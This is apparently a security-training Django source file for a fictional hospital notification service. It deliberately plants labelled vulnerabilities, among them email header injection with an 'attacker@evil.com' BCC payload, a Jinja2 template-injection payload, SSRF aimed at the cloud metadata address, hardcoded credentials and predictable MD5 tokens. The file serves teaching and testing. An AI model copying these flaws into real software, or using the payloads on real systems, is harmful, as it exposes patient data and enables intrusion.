"""
MediCore HMS — Email and SMS Notification Service
Sends appointment reminders, lab alerts, and PHI communications

Security training reference: VULN-780 through VULN-792
"""

import hashlib
import logging
import smtplib
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests
from jinja2 import Template
from django.conf import settings
from django.http import JsonResponse, HttpResponse
from django.views import View
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from patients.models import Patient

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# VULN-783: SMTP credentials hardcoded in source
# VULN-792: Twilio credentials hardcoded in source
# ---------------------------------------------------------------------------
SMTP_HOST = 'smtp.medicore.internal'
SMTP_PORT = 587
SMTP_USER = 'notifications@medicore.internal'
SMTP_PASSWORD = 'FakeSMTP_MediCore_2024!'         # VULN-783

TWILIO_ACCOUNT_SID = 'ACfake_medicore_account_2024'
TWILIO_AUTH_TOKEN = 'fake_twilio_medicore_2024_abcd1234'   # VULN-792
TWILIO_FROM_NUMBER = '+15005550006'


def send_smtp_email(to_address, to_name, subject, body_html):
    """
    Send an email via SMTP.

    VULN-780: Email header injection in the To field.
    patient_name is interpolated directly into the RFC 2822 header value.
    An attacker who controls their name record can inject additional headers:
        name = "Evil\r\nBCC: attacker@evil.com\r\nX-Extra: header"
    resulting in a blind carbon copy to an external address.

    VULN-781: Email header injection in the Subject field.
    subject originates from request.POST and is set without sanitisation.
    An attacker can inject '\r\nBCC:' or '\r\nFrom:' overrides.
    """
    msg = MIMEMultipart('alternative')
    # VULN-780: to_name (patient_name) can contain \r\n header injection
    msg['To'] = f"{to_name} <{to_address}>"          # VULN-780
    msg['From'] = SMTP_USER
    # VULN-781: subject directly from user input
    msg['Subject'] = subject                           # VULN-781

    part = MIMEText(body_html, 'html')
    msg.attach(part)

    with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
        server.starttls()
        server.login(SMTP_USER, SMTP_PASSWORD)
        server.sendmail(SMTP_USER, to_address, msg.as_string())


@method_decorator(csrf_exempt, name='dispatch')
class SendNotificationView(View):
    """API endpoint to trigger patient notifications."""

    def post(self, request):
        patient_id = request.POST.get('patient_id')
        subject = request.POST.get('subject', 'MediCore Notification')  # VULN-781
        # VULN-782: CC/BCC user-controlled header injection
        cc = request.POST.get('cc', '')   # VULN-782

        try:
            patient = Patient.objects.get(pk=patient_id)
        except Patient.DoesNotExist:
            # VULN-790: Email enumeration — response differs based on existence
            return JsonResponse({'error': 'Patient not found'}, status=404)

        # Build email from DB template (VULN-784, VULN-785)
        body = render_email_template(patient)

        msg = MIMEMultipart('alternative')
        msg['To'] = f"{patient.name} <{patient.email}>"   # VULN-780
        msg['From'] = SMTP_USER
        msg['Subject'] = subject                            # VULN-781
        # VULN-782: CC injected from user input
        if cc:
            msg['CC'] = cc   # VULN-782

        msg.attach(MIMEText(body, 'html'))

        with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
            server.starttls()
            server.login(SMTP_USER, SMTP_PASSWORD)
            server.sendmail(SMTP_USER, patient.email, msg.as_string())

        return JsonResponse({'status': 'sent'})


def render_email_template(patient):
    """
    Render email body using a Jinja2 template stored in the database.

    VULN-784: Template injection — template_body comes from the database
    (admin-editable), and is rendered with a user-derived context variable
    (patient.name).  If the template body itself contains Jinja2 expressions,
    and patient.name contains injection payloads, SSTI may occur.

    VULN-785: SSTI via admin-stored template.
    A superuser (or compromised admin account) can store:
        {{ ''.__class__.__mro__[1].__subclasses__() }}
    in the email template.  When the notification service renders it, this
    executes arbitrary Python in the server process.
    """
    from notifications.models import EmailTemplate
    tmpl_obj = EmailTemplate.objects.filter(active=True).first()

    if tmpl_obj:
        template_body = tmpl_obj.body   # VULN-785: from DB, admin-controlled
    else:
        template_body = "Dear {{ name }}, your appointment is confirmed."

    # VULN-784: Template rendered with user-controlled name variable
    # VULN-785: template_body itself from DB — full SSTI if admin is compromised
    rendered = Template(template_body).render(name=patient.name)
    return rendered


@method_decorator(csrf_exempt, name='dispatch')
class AppointmentReminderView(View):
    """Send SMS appointment reminders via Twilio."""

    def post(self, request):
        patient_id = request.POST.get('patient_id')

        try:
            patient = Patient.objects.get(pk=patient_id)
        except Patient.DoesNotExist:
            # VULN-790: different error message enables patient enumeration
            return JsonResponse({'error': 'Patient email not found'}, status=404)

        appointment = patient.appointment_set.filter(status='scheduled').first()
        if not appointment:
            return JsonResponse({'error': 'No scheduled appointment'}, status=404)

        # VULN-787: PHI leaked in SMS body — diagnosis included
        sms_body = (
            f"Reminder: {patient.name} appointment for "
            f"{patient.diagnosis} at {appointment.scheduled_time}. "  # VULN-787: diagnosis in SMS
            f"Location: {appointment.location}. "
            f"Ref: {patient.insurance_id}"                            # VULN-787: insurance ID in SMS
        )

        # VULN-789: No rate limiting — can send unlimited SMS via this endpoint
        send_sms(patient.phone, sms_body)   # VULN-789

        return JsonResponse({'status': 'reminder_sent'})


def send_sms(to_number, body):
    """
    Send SMS via Twilio REST API.
    VULN-792: TWILIO_AUTH_TOKEN is hardcoded above.
    VULN-789: Called without any rate limiting guard.
    """
    url = f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_ACCOUNT_SID}/Messages.json"
    requests.post(url, auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN), data={
        'From': TWILIO_FROM_NUMBER,
        'To': to_number,
        'Body': body,
    })


@method_decorator(csrf_exempt, name='dispatch')
class UnsubscribeView(View):
    """Handle email unsubscribe requests."""

    def get(self, request, token):
        """
        VULN-786: Unsubscribe token generated with predictable algorithm.
        token = MD5(email + date) — an attacker who knows a patient's email
        and the approximate signup/send date can brute-force or precompute
        valid tokens to unsubscribe victims from critical health notifications.
        """
        email = request.GET.get('email', '')
        date = request.GET.get('date', str(datetime.date.today()))
        # VULN-786: MD5 of email+date — predictable, collision-prone
        expected_token = hashlib.md5(f"{email}{date}".encode()).hexdigest()
        if token == expected_token:
            # Mark as unsubscribed
            Patient.objects.filter(email=email).update(email_opt_out=True)
            return HttpResponse("Unsubscribed successfully.")
        return HttpResponse("Invalid token.", status=400)


@method_decorator(csrf_exempt, name='dispatch')
class PasswordResetView(View):
    """
    VULN-791: Password reset link valid for 72 hours.
    Industry standard is 15-60 minutes. A 72-hour window gives an attacker
    who intercepts the email (e.g., via a shared inbox, forwarding rule, or
    mail server compromise) a much larger attack window.
    """

    def post(self, request):
        email = request.POST.get('email', '')
        try:
            user = Patient.objects.get(email=email)
            # VULN-791: 72-hour expiry
            expiry = datetime.datetime.now() + datetime.timedelta(hours=72)
            token = hashlib.sha256(f"{email}{expiry}".encode()).hexdigest()
            reset_url = f"https://medicore.internal/reset-password?token={token}&email={email}"
            send_smtp_email(email, user.name, 'Password Reset - MediCore', f'<a href="{reset_url}">Reset</a>')
            return JsonResponse({'status': 'reset_sent'})
        except Patient.DoesNotExist:
            # VULN-790: different response reveals whether email exists
            return JsonResponse({'error': 'No account with that email'}, status=404)


@method_decorator(csrf_exempt, name='dispatch')
class WebhookNotifyView(View):
    """
    Trigger custom webhook for doctor notification integrations.

    VULN-788: SSRF via webhook URL — doctor.webhook_url is stored in the DB
    and posted to without any URL validation. An attacker who can update a
    doctor record (or who is an attacker-controlled doctor) can point the
    webhook at an internal service:
        webhook_url = "http://169.254.169.254/latest/meta-data/"
    """

    def post(self, request):
        from staff.models import Doctor
        doctor_id = request.POST.get('doctor_id')
        payload = {
            'event': request.POST.get('event'),
            'patient_id': request.POST.get('patient_id'),
            'message': request.POST.get('message'),
        }
        try:
            doctor = Doctor.objects.get(pk=doctor_id)
            # VULN-788: SSRF — webhook_url from DB, no allowlist/validation
            requests.post(doctor.webhook_url, json=payload, timeout=5)  # VULN-788
            return JsonResponse({'status': 'webhook_triggered'})
        except Exception as e:
            return JsonResponse({'error': str(e)}, status=500)
